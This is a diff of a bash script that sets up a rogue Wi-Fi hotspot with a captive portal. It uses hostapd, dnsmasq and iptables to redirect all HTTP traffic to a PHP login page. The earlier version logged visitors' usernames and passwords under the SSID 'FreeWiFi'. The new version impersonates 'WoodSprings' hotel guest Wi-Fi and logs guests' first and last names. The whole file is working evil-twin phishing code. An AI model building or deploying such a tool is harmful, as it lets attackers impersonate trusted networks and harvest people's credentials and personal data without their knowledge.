@@ -3,7 +3,7 @@
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
 HOTSPOT_IFACE="wlp4s0"
-SSID="FreeWiFi"
+SSID="WoodSpringsWiFi"
 
 HOSTAPD_CONF="/tmp/hostapd.conf"
 DNSMASQ_CONF="/tmp/dnsmasq.conf"
@@ -12,59 +12,90 @@ DNSMASQ_CONF="/tmp/dnsmasq.conf"
 # Ensure portal and logs exist
 # ---------------------------
 ensure_directories() {
-    if [ ! -d "$PORTAL_DIR" ]; then
-        echo "[+] Portal folder missing. Creating..."
-        mkdir -p "$PORTAL_DIR"
-    fi
+    mkdir -p "$PORTAL_DIR"
+    mkdir -p "logs"
 
-    # Create index.php for iOS captive portal
+    # Create index.php for captive portal
     if [ ! -f "$PORTAL_DIR/index.php" ]; then
-cat > "$PORTAL_DIR/index.php" <<EOF
+cat > "$PORTAL_DIR/index.php" <<'EOF'
 <?php
-// iOS captive portal detection
-if (\$_SERVER['REQUEST_URI'] == "/hotspot-detect.html") {
+// iOS & Android captive portal detection
+$redirectPaths = ['/hotspot-detect.html','/generate_204','/connecttest.txt','/ncsi.txt'];
+if (in_array($_SERVER['REQUEST_URI'], $redirectPaths)) {
     header("Location: /index.php");
     exit;
 }
 
-// Handle login submission
-if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
-    \$username = isset(\$_POST['username']) ? \$_POST['username'] : '';
-    \$password = isset(\$_POST['password']) ? \$_POST['password'] : '';
-    file_put_contents('../logs/log.txt', date('Y-m-d H:i:s') . " - USER: \$username PASS: \$password\\n", FILE_APPEND);
+// Handle form submission
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $firstname = isset($_POST['firstname']) ? $_POST['firstname'] : '';
+    $lastname = isset($_POST['lastname']) ? $_POST['lastname'] : '';
+    file_put_contents('../logs/log.txt', date('Y-m-d H:i:s') . " - FIRSTNAME: $firstname LASTNAME: $lastname\n", FILE_APPEND);
+
+    // Show connected message
+    echo "<!DOCTYPE html>
+<html>
+<head>
+<meta charset='UTF-8'>
+<title>Connected</title>
+<style>
+body { display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial,sans-serif; background:linear-gradient(to right,#1e3c72,#2a5298); color:#fff; }
+.message { background:#fff; color:#333; padding:30px; border-radius:12px; width:320px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.3);}
+</style>
+</head>
+<body>
+<div class='message'>
+<h1>Connected!</h1>
+<p>Welcome, $firstname $lastname</p>
+<p>You now have access to WoodSprings Guest Wi‑Fi.</p>
+</div>
+</body>
+</html>";
+    exit;
 }
+
+// Default: show login page
 include("index.html");
-?>
 EOF
     fi
 
-    # Create a default login page if missing
+    # WoodSprings login page
     if [ ! -f "$PORTAL_DIR/index.html" ]; then
-cat > "$PORTAL_DIR/index.html" <<EOF
+cat > "$PORTAL_DIR/index.html" <<'EOF'
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Login Page</title>
+<meta charset="UTF-8">
+<title>WoodSprings Guest Wi‑Fi</title>
+<style>
+body { margin:0; font-family:Arial,sans-serif; background:linear-gradient(to right,#1e3c72,#2a5298); color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; }
+.container { background:#fff; color:#333; padding:30px; border-radius:12px; width:320px; box-shadow:0 10px 25px rgba(0,0,0,0.3); text-align:center; }
+.logo { font-size:24px; font-weight:bold; margin-bottom:10px; color:#2a5298; }
+.subtitle { font-size:14px; margin-bottom:20px; color:#666; }
+input { width:100%; padding:10px; margin:8px 0; border-radius:6px; border:1px solid #ccc; }
+button { width:100%; padding:10px; background:#2a5298; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:bold; }
+button:hover { background:#1e3c72; }
+.footer { margin-top:15px; font-size:12px; color:#999; }
+</style>
 </head>
 <body>
-<h1>Welcome to Free WiFi</h1>
+<div class="container">
+<div class="logo">WoodSprings</div>
+<div class="subtitle">Guest Wi‑Fi Access</div>
 <form method="POST">
-<input type="text" name="username" placeholder="Username"><br>
-<input type="password" name="password" placeholder="Password"><br>
-<input type="submit" value="Login">
+<input type="text" name="firstname" placeholder="First Name" required>
+<input type="text" name="lastname" placeholder="Last Name" required>
+<button type="submit">Connect</button>
 </form>
+<div class="footer">Complimentary internet for hotel guests</div>
+</div>
 </body>
 </html>
 EOF
     fi
 
-    if [ ! -d "logs" ]; then
-        mkdir -p logs
-    fi
-
-    if [ ! -f "$LOG_FILE" ]; then
-        touch "$LOG_FILE"
-    fi
+    # Ensure logs
+    touch "$LOG_FILE"
 }
 
 # ---------------------------
@@ -78,7 +109,7 @@ setup() {
 }
 
 # ---------------------------
-# Create hostapd and dnsmasq configs
+# Hostapd & dnsmasq config
 # ---------------------------
 create_configs() {
 cat > $HOSTAPD_CONF <<EOF
@@ -110,25 +141,17 @@ start_hotspot() {
     sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
     sudo ip link set $HOTSPOT_IFACE up
 
-    # Enable IP forwarding
     sudo sysctl -w net.ipv4.ip_forward=1
-
-    # Start hostapd & dnsmasq
     sudo hostapd $HOSTAPD_CONF -B
     sudo dnsmasq -C $DNSMASQ_CONF
 
-    # Redirect all HTTP traffic to index.php
+    # Redirect all HTTP traffic to portal
     sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
     sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE
 
-    echo "[+] Hotspot started with iOS-compatible captive portal."
-    echo "    Connect your device to SSID: $SSID"
-    echo "    Devices will be redirected to the login page automatically."
+    echo "[+] Hotspot started. Devices should see 'Wi-Fi Needs a Login' popup."
 }
 
-# ---------------------------
-# Stop hotspot
-# ---------------------------
 stop_hotspot() {
     echo "[+] Stopping hotspot..."
     sudo pkill hostapd
@@ -139,32 +162,16 @@ stop_hotspot() {
     echo "[+] Hotspot stopped."
 }
 
-# ---------------------------
-# Start PHP login page server
-# ---------------------------
 start_server() {
     ensure_directories
     cd "$PORTAL_DIR" || exit
     php -S 0.0.0.0:80
 }
 
-# ---------------------------
-# Show connected devices
-# ---------------------------
-show_devices() {
-    echo "[+] Connected devices (DHCP leases):"
-    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
-}
-
-# ---------------------------
-# Logs
-# ---------------------------
+show_devices() { cat /var/lib/misc/dnsmasq.leases 2>/dev/null; }
 view_logs() { cat "$LOG_FILE"; }
 live_logs() { tail -f "$LOG_FILE"; }
 
-# ---------------------------
-# Edit page (auto-create folder & file if missing)
-# ---------------------------
 edit_page() {
     ensure_directories
     nano "$PORTAL_DIR/index.html"
@@ -174,30 +181,30 @@ edit_page() {
 # Main Menu
 # ---------------------------
 while true; do
-    echo ""
-    echo "====== iOS-Compatible Captive Portal Tool ======"
-    echo "1) Setup Dependencies"
-    echo "2) Start Hotspot + Captive Portal"
-    echo "3) Stop Hotspot"
-    echo "4) Start Login Page Server"
-    echo "5) Show Connected Devices"
-    echo "6) View Logs"
-    echo "7) Live Logs"
-    echo "8) Edit Login Page"
-    echo "9) Exit"
-    echo "==============================================="
-    read -p "Select option: " choice
+echo ""
+echo "====== Captive Portal Number Tool ======"
+echo "1) Setup Dependencies"
+echo "2) Start Hotspot + Captive Portal"
+echo "3) Stop Hotspot"
+echo "4) Start Login Page Server"
+echo "5) Show Connected Devices"
+echo "6) View Logs"
+echo "7) Live Logs"
+echo "8) Edit Login Page"
+echo "9) Exit"
+echo "======================================="
+read -p "Select option: " choice
 
-    case $choice in
-        1) setup ;;
-        2) start_hotspot ;;
-        3) stop_hotspot ;;
-        4) start_server ;;
-        5) show_devices ;;
-        6) view_logs ;;
-        7) live_logs ;;
-        8) edit_page ;;
-        9) exit ;;
-        *) echo "Invalid option" ;;
-    esac
+case $choice in
+1) setup ;;
+2) start_hotspot ;;
+3) stop_hotspot ;;
+4) start_server ;;
+5) show_devices ;;
+6) view_logs ;;
+7) live_logs ;;
+8) edit_page ;;
+9) exit ;;
+*) echo "Invalid option" ;;
+esac
 done
